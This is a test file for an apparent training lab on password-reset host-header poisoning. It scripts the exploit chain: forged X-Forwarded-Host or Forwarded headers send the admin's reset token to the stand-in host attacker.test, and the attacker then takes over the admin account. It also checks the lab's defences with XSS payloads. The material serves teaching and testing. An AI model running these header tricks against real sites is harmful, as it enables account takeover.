// src/districts/gatekeeper/gk-09-reset-host-poisoning/gk-09.spec.ts
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import {
  FLAG_RE, attackerHits, bare, describeExploitMatrix, describeLabView, freshSession, panelOf, unescapeHtml, type Agent,
} from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { ADMIN_MAILBOX, PLAYER_MAILBOX } from '../../../core/sim.js';
import { describeCurlExample } from '../_shared/pilgrim-lab.testkit.js';
import { GK09 } from './challenge.js'; // registers GK-09 before createApp() inside freshSession
import { labState } from './model.js';

const LAB = '/d/gatekeeper/reset-host-poisoning';
const ADMIN = 'citadel_admin';
const TAKEN = 'taken-over-1';

type Headers = Readonly<Record<string, string>>;
type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;

// --- The player's moves --------------------------------------------------------------------------------------------
const home = (a: Agent, l: Level, lang = 'en') => a.get(`${LAB}?level=${l}&lang=${lang}`);
const signIn = (a: Agent, l: Level, username: string, password: string) =>
  a.post(`${LAB}?level=${l}`).type('form').send({ username, password });
/** "Forgot your password?" for `email`, with extra request headers (what curl -H adds). */
const forgot = (a: Agent, l: Level, email: string, headers: Headers = {}) =>
  a.post(`${LAB}/forgot?level=${l}`).set({ ...headers }).type('form').send({ email });
const checkMail = (a: Agent, l: Level) => a.post(`${LAB}/victim/check-mail?level=${l}`);
const resetWith = (a: Agent, l: Level, token: string, password: string) =>
  a.post(`${LAB}/reset?level=${l}`).type('form').send({ token, password });
const tokenOf = (url: string | undefined): string => (url === undefined ? '' : new URL(url).searchParams.get('token') ?? '');
/** The admin's newest reset link (test seam: the admin's mailbox is never shown). */
const adminLink = (sid: string, l: Level): string | undefined => labState(sid, l).world.inbox.newest(ADMIN_MAILBOX)?.links[0];

/** The exploit: ask for the admin's reset with a poisoned header, let the admin click, read the token off your log. */
const poisoned = (headers: Headers): Script => async (a, l) => {
  await forgot(a, l, ADMIN_MAILBOX, headers);
  await checkMail(a, l);
  const hit = attackerHits((await home(a, l)).text).find((h) => h.url.includes('/reset?token='));
  await resetWith(a, l, tokenOf(hit?.url) || 'none', TAKEN);
  return signIn(a, l, ADMIN, TAKEN);
};

// Acolyte: the link's host is X-Forwarded-Host, verbatim.
const acolyteExploit = poisoned({ 'X-Forwarded-Host': 'attacker.test' });
// Templar: X-Forwarded-Host must contain "citadel"; a subdomain of your own server does.
const templarExploit = poisoned({ 'X-Forwarded-Host': 'citadel.attacker.test' });
// Inquisitor: X-Forwarded-Host is ignored, but the standard Forwarded header is trusted.
const inquisitorExploit = poisoned({ Forwarded: 'for=203.0.113.7;host=attacker.test;proto=http' });

/** The honest flow: ask for your own reset, open the mail's link from your mailbox in the lab, set a password, sign in. */
const honestReset: Script = async (a, l) => {
  await forgot(a, l, PLAYER_MAILBOX);
  const href = /<a href="([^"]*)">open in lab<\/a>/.exec(panelOf((await home(a, l)).text))?.[1];
  const link = href === undefined ? undefined : unescapeHtml(href);
  const form = await a.get(link ?? `${LAB}/reset?level=${l}`);
  const token = /<input name="token" type="text"[^>]*value="([^"]*)"/.exec(form.text)?.[1] ?? '';
  await resetWith(a, l, unescapeHtml(token), 'fresh-pass-1');
  return signIn(a, l, 'pilgrim', 'fresh-pass-1');
};

describeExploitMatrix<Script>({
  challenge: GK09,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script(agent, level, sid),
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: 'Invalid username or password.',
  legit: [
    { name: 'own account pilgrim/pilgrim', input: (a, l) => signIn(a, l, 'pilgrim', 'pilgrim'), expect: 'Welcome, pilgrim' },
    { name: 'reset your own password from your mailbox', input: honestReset, expect: 'Welcome, pilgrim' },
    {
      name: 'the admin opens an honest reset mail: nothing reaches your server',
      input: async (a, l) => { await forgot(a, l, ADMIN_MAILBOX); await checkMail(a, l); return home(a, l); },
      expect: /ended on a citadel\.test page \(HTTP 200\)[\s\S]*No requests yet\./,
    },
  ],
  malformed: [], // no query and no parser: nothing that can raise a database error
  privileged: {
    name: 'the real admin password',
    input: (a, l, sid) => signIn(a, l, ADMIN, labState(sid, l).members.find((m) => m.username === ADMIN)!.password),
    expect: /Welcome, citadel_admin/,
  },
});

describeLabView({
  challenge: GK09,
  path: LAB,
  account: /pilgrim<\/code> \/ <code>pilgrim/,
  echoField: 'username',
  extra: { password: 'x' },
  oddBodies: [{ username: { toString: 1 }, password: ['a'] }, [1, 2], {}],
  ok: (agent, level) => signIn(agent, level, 'pilgrim', 'pilgrim'),
  bad: (agent, level) => signIn(agent, level, 'pilgrim', 'nope'),
});

describeCurlExample({
  challenge: GK09, path: LAB,
  curl: () => ({ path: '/forgot', headers: ['<Header>: <value>'], form: [`email=${ADMIN_MAILBOX}`] }),
});

describe('GK-09 where the reset link points', () => {
  const linkFor = async (level: Level, headers: Headers): Promise<string> => {
    const { agent, sid } = await freshSession();
    await forgot(agent, level, ADMIN_MAILBOX, headers);
    return adminLink(sid, level) ?? '';
  };
  const cases: [Level, Headers, string][] = [
    ['acolyte', {}, 'http://citadel.test/reset?token='],
    ['acolyte', { 'X-Forwarded-Host': 'attacker.test' }, 'http://attacker.test/reset?token='],
    ['acolyte', { 'X-Forwarded-Host': 'evil.example' }, 'http://evil.example/reset?token='],
    ['templar', { 'X-Forwarded-Host': 'attacker.test' }, 'http://citadel.test/reset?token='],
    ['templar', { 'X-Forwarded-Host': 'citadel.attacker.test' }, 'http://citadel.attacker.test/reset?token='],
    ['templar', { 'X-Forwarded-Host': 'attacker.test/citadel' }, 'http://attacker.test/citadel/reset?token='],
    ['templar', { Forwarded: 'host=citadel.attacker.test' }, 'http://citadel.test/reset?token='],
    ['inquisitor', { 'X-Forwarded-Host': 'citadel.attacker.test' }, 'http://citadel.test/reset?token='],
    ['inquisitor', { Forwarded: 'host=attacker.test' }, 'http://attacker.test/reset?token='],
    ['inquisitor', { Forwarded: 'for=203.0.113.7; Host="attacker.test"; proto=http' }, 'http://attacker.test/reset?token='],
    ['inquisitor', { Forwarded: 'for=203.0.113.7, host=attacker.test' }, 'http://citadel.test/reset?token='],
    ['inquisitor', { Forwarded: 'for=203.0.113.7' }, 'http://citadel.test/reset?token='],
    ['divine', { 'X-Forwarded-Host': 'attacker.test' }, 'http://citadel.test/reset?token='],
    ['divine', { 'X-Forwarded-Host': 'citadel.attacker.test', Forwarded: 'host=attacker.test', 'X-Forwarded-Proto': 'https' }, 'http://citadel.test/reset?token='],
  ];
  it.each(cases)('%s with %j: the mail links %s…', async (level, headers, prefix) => {
    const link = await linkFor(level, headers);
    expect(link.startsWith(prefix), link).toBe(true);
    expect(tokenOf(link)).toMatch(/^[A-Za-z0-9_-]{43}$/);
  });

  it('the raw Host header is never a vector: a non-loopback Host is refused before the lab runs', async () => {
    const { app, sid } = await freshSession();
    const res = await bare(app, sid).post(`${LAB}/forgot?level=acolyte`).set('Host', 'attacker.test').type('form').send({ email: ADMIN_MAILBOX });
    expect(res.status).toBe(421);
    expect(adminLink(sid, 'acolyte')).toBeUndefined();
  });
});

describe('GK-09 the victim flow end to end', () => {
  it('the admin clicks the poisoned link: your server logs the token, and only the reset form uses it', async () => {
    const { agent, sid } = await freshSession();
    labState(sid, 'acolyte').world.now = () => Date.UTC(2026, 10, 16, 9, 0, 0);
    await forgot(agent, 'acolyte', ADMIN_MAILBOX, { 'X-Forwarded-Host': 'attacker.test' });
    const token = tokenOf(adminLink(sid, 'acolyte'));
    const before = await home(agent, 'acolyte');
    expect(before.text).not.toContain(token); // nothing shows the token before the admin clicks
    expect((await checkMail(agent, 'acolyte')).status).toBe(303);
    const page = await home(agent, 'acolyte');
    const hits = attackerHits(page.text);
    expect(hits).toEqual([{ seq: 1, at: '2026-11-16T09:00:00.000Z', method: 'GET', url: `http://attacker.test/reset?token=${token}` }]);
    expect(panelOf(page.text)).toContain('Visit 1: 1 request(s); reached your server (attacker.test).');
    expect(page.text.replace(panelOf(page.text), '')).not.toContain(token); // the token is shown only in your log
    expect((await resetWith(agent, 'acolyte', token, TAKEN)).text).toContain('Password updated for citadel_admin.');
    expect((await signIn(agent, 'acolyte', ADMIN, TAKEN)).text).toMatch(FLAG_RE);
  });

  it('templar: the subdomain trick reaches your server too', async () => {
    const { agent } = await freshSession();
    await forgot(agent, 'templar', ADMIN_MAILBOX, { 'X-Forwarded-Host': 'citadel.attacker.test' });
    await checkMail(agent, 'templar');
    expect(attackerHits((await home(agent, 'templar')).text).map((h) => new URL(h.url).host)).toEqual(['citadel.attacker.test']);
  });

  it('a citadel link is opened on the citadel: the reset page, nothing logged, the token stays usable', async () => {
    const { agent, sid } = await freshSession();
    await forgot(agent, 'divine', ADMIN_MAILBOX, { 'X-Forwarded-Host': 'attacker.test' });
    await checkMail(agent, 'divine');
    const visit = labState(sid, 'divine').world.visits.at(-1)!;
    expect(visit.outcome).toBe('page');
    expect(visit.page).toMatchObject({ status: 200, body: 'Choose a new password.' });
    expect(attackerHits((await home(agent, 'divine')).text)).toEqual([]);
  });

  it('the admin\'s mail is never shown, only yours; the admin\'s mailbox being empty is told in your language', async () => {
    const { agent, sid } = await freshSession();
    const empty = await checkMail(agent, 'acolyte');
    expect(empty.status).toBe(303);
    expect(panelOf((await home(agent, 'acolyte')).text)).toContain('The victim&#39;s mailbox is empty.');
    expect(panelOf((await home(agent, 'acolyte', 'id')).text)).toContain('Kotak surat korban kosong.');
    await forgot(agent, 'acolyte', ADMIN_MAILBOX);
    const page = await home(agent, 'acolyte');
    expect(page.text).not.toContain(tokenOf(adminLink(sid, 'acolyte')));
    expect(page.text).not.toContain('Reset your Citadel password');
    expect(panelOf(page.text)).toContain('No mail yet.');
  });

  it('isolates players and levels: a poisoned reset in one lab reaches no other log', async () => {
    const a = await freshSession();
    const b = await freshSession(a.app);
    await forgot(a.agent, 'acolyte', ADMIN_MAILBOX, { 'X-Forwarded-Host': 'attacker.test' });
    await checkMail(a.agent, 'acolyte');
    await checkMail(b.agent, 'acolyte');
    await checkMail(a.agent, 'templar');
    expect(attackerHits((await home(a.agent, 'acolyte')).text)).toHaveLength(1);
    expect(attackerHits((await home(b.agent, 'acolyte')).text)).toEqual([]);
    expect(attackerHits((await home(a.agent, 'templar')).text)).toEqual([]);
    // The token works only in the lab that issued it.
    const token = attackerHits((await home(a.agent, 'acolyte')).text).map((h) => tokenOf(h.url))[0];
    expect((await resetWith(b.agent, 'acolyte', token, TAKEN)).text).toContain('This reset link is invalid or has expired.');
    expect((await resetWith(a.agent, 'templar', token, TAKEN)).text).toContain('This reset link is invalid or has expired.');
  });
});

describe('GK-09 reset links (the same at every level)', () => {
  it('a token is used once, and lapses after 15 minutes of the lab clock', async () => {
    const { agent, sid } = await freshSession();
    const world = labState(sid, 'acolyte').world;
    const t0 = Date.UTC(2026, 10, 16, 12, 0, 0);
    world.now = () => t0;
    await forgot(agent, 'acolyte', PLAYER_MAILBOX);
    const first = tokenOf(world.inbox.newest(PLAYER_MAILBOX)?.links[0]);
    await forgot(agent, 'acolyte', PLAYER_MAILBOX);
    const second = tokenOf(world.inbox.newest(PLAYER_MAILBOX)?.links[0]);
    expect((await resetWith(agent, 'acolyte', first, 'one-1')).text).toContain('Password updated for pilgrim.');
    expect((await resetWith(agent, 'acolyte', first, 'two-2')).text).toContain('This reset link is invalid or has expired.');
    world.now = () => t0 + 15 * 60_000;
    expect((await agent.get(`${LAB}/reset?level=acolyte&token=${second}`)).text).toContain('This reset link is invalid or has expired.');
    expect((await resetWith(agent, 'acolyte', second, 'three-3')).text).toContain('This reset link is invalid or has expired.');
    expect(JSON.stringify([...labState(sid, 'acolyte').resets.keys()])).not.toContain(second); // hashed at rest
  });

  it('a reset needs a new password, and an empty one does not use up the token', async () => {
    const { agent, sid } = await freshSession();
    await forgot(agent, 'templar', PLAYER_MAILBOX);
    const token = tokenOf(labState(sid, 'templar').world.inbox.newest(PLAYER_MAILBOX)?.links[0]);
    expect((await resetWith(agent, 'templar', token, '')).text).toContain('Choose a new password');
    expect((await resetWith(agent, 'templar', token, 'later-1')).text).toContain('Password updated for pilgrim.');
  });

  it('the forgot-password answer is the same for every address', async () => {
    for (const level of LEVELS) {
      const { agent } = await freshSession();
      const answers = new Set<string>();
      for (const email of [PLAYER_MAILBOX, ADMIN_MAILBOX, 'nobody@citadel.test', '']) {
        const res = await forgot(agent, level, email);
        expect(res.status, `${level} ${email}`).toBe(303);
        const sent = await agent.get(String(res.headers.location));
        answers.add(/<p class="lab-message[^"]*"[^>]*>([^<]*)<\/p>/.exec(sent.text)?.[1] ?? '');
      }
      expect([...answers], level).toEqual(['If an account uses that address, a reset link is on its way.']);
    }
  });

  it('the stored lists stay bounded', async () => {
    const { agent, sid } = await freshSession();
    for (let i = 0; i < 30; i++) await forgot(agent, 'divine', i % 2 === 0 ? PLAYER_MAILBOX : ADMIN_MAILBOX);
    expect(labState(sid, 'divine').resets.size).toBeLessThanOrEqual(20);
    expect(labState(sid, 'divine').world.inbox.list(ADMIN_MAILBOX).length).toBeLessThanOrEqual(10);
  });
});

describe('GK-09 your real browser never leaves the lab (sendSimRedirect)', () => {
  it('without a poisoned header the form answers 303 to the lab\'s own "sent" page, at the served level', async () => {
    for (const level of LEVELS) {
      const { agent } = await freshSession();
      const res = await forgot(agent, level, PLAYER_MAILBOX);
      expect(res.status, level).toBe(303);
      expect(res.headers.location, level).toBe(`${LAB}/forgot/sent?level=${level}`);
    }
  });

  it('a poisoned host is never a real Location: you get a page saying where your browser would go', async () => {
    const tricks: [Level, Headers][] = [
      ['acolyte', { 'X-Forwarded-Host': 'attacker.test' }],
      ['acolyte', { 'X-Forwarded-Host': 'evil.example:8080' }],
      ['acolyte', { 'X-Forwarded-Host': '127.0.0.1:1' }],
      ['acolyte', { 'X-Forwarded-Host': 'attacker.test\\@citadel.test' }],
      ['acolyte', { 'X-Forwarded-Host': 'citadel.test@attacker.test' }],
      ['templar', { 'X-Forwarded-Host': 'citadel.attacker.test' }],
      ['inquisitor', { Forwarded: 'host=attacker.test' }],
      ['inquisitor', { Forwarded: 'host="localhost:3000"' }],
    ];
    for (const [level, headers] of tricks) {
      const { agent } = await freshSession();
      const res = await forgot(agent, level, ADMIN_MAILBOX, headers);
      const where = `${level} ${JSON.stringify(headers)}`;
      if (res.status >= 300 && res.status < 400) {
        expect(String(res.headers.location), where).toMatch(new RegExp(`^${LAB}[/?]`));
      } else {
        expect(res.status, where).toBe(200);
        expect(res.headers.location, where).toBeUndefined();
        const away = /<section class="sim-away"[\s\S]*?<\/section>/.exec(res.text)?.[0] ?? '';
        expect(away, where).toContain('<code>http://');
        expect(away, where).not.toMatch(/href=/);
      }
    }
    const { agent } = await freshSession();
    const away = await forgot(agent, 'acolyte', ADMIN_MAILBOX, { 'X-Forwarded-Host': 'attacker.test' });
    expect(away.status).toBe(200);
    expect(away.text).toContain('<code>http://attacker.test/forgot/sent</code>');
  });
});

describe('GK-09 lab view specifics', () => {
  it('links are absolute lab paths with the level; the forgot page has its own form', async () => {
    const { agent } = await freshSession();
    const page = await home(agent, 'templar');
    expect(page.text).toContain(`href="${LAB}/forgot?level=templar"`);
    const form = await agent.get(`${LAB}/forgot?level=templar`);
    expect(form.status).toBe(200);
    expect(form.text).toMatch(/<input name="email" type="text"/);
    const labForms = [...form.text.matchAll(/<form[^>]*>/g)].map((m) => m[0]).filter((f) => !f.includes('class="sim-action"'));
    expect(labForms).toHaveLength(1);
    expect(labForms[0]).not.toMatch(/\saction=/);
  });

  it('the forgot and reset pages keep what you typed, escaped', async () => {
    const { agent } = await freshSession();
    const payload = '"><script>alert(1)</script>';
    const reset = await agent.post(`${LAB}/reset?level=acolyte`).type('form').send({ token: payload, password: 'x' });
    expect(reset.text).toContain('value="&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"');
    expect(reset.text).not.toContain('<script>alert(1)');
  });

  it('a link the lab builds from a header is shown escaped in your mailbox', async () => {
    const { agent } = await freshSession();
    await forgot(agent, 'acolyte', PLAYER_MAILBOX, { 'X-Forwarded-Host': 'attacker.test/"><img src=x onerror=alert(1)>' });
    const panel = panelOf((await home(agent, 'acolyte')).text);
    expect(panel).not.toMatch(/<img/);
    expect(panel).toContain('http://attacker.test/&#34;&gt;&lt;img src=x onerror=alert(1)&gt;/reset?token=');
  });

  it('the victim action says what the admin does, in both languages', async () => {
    const { agent } = await freshSession();
    expect(panelOf((await home(agent, 'acolyte')).text)).toContain('opens the newest mail and clicks its first link');
    expect(panelOf((await home(agent, 'acolyte', 'id')).text)).toContain('membuka surat terbaru dan mengklik tautan pertamanya');
  });

  it('odd bodies on the forgot and reset forms are a failed request, never a 500 or a flag', async () => {
    const { agent } = await freshSession();
    for (const level of LEVELS) {
      for (const path of ['/forgot', '/reset']) {
        for (const body of [{ email: { toString: 1 }, token: ['a'], password: { a: 1 } }, [1, 2], {}]) {
          const res = await agent.post(`${LAB}${path}?level=${level}`).send(body as object);
          expect([200, 303], `${level} ${path}`).toContain(res.status);
          expect(res.text ?? '', `${level} ${path}`).not.toMatch(FLAG_RE);
        }
      }
    }
  });
});
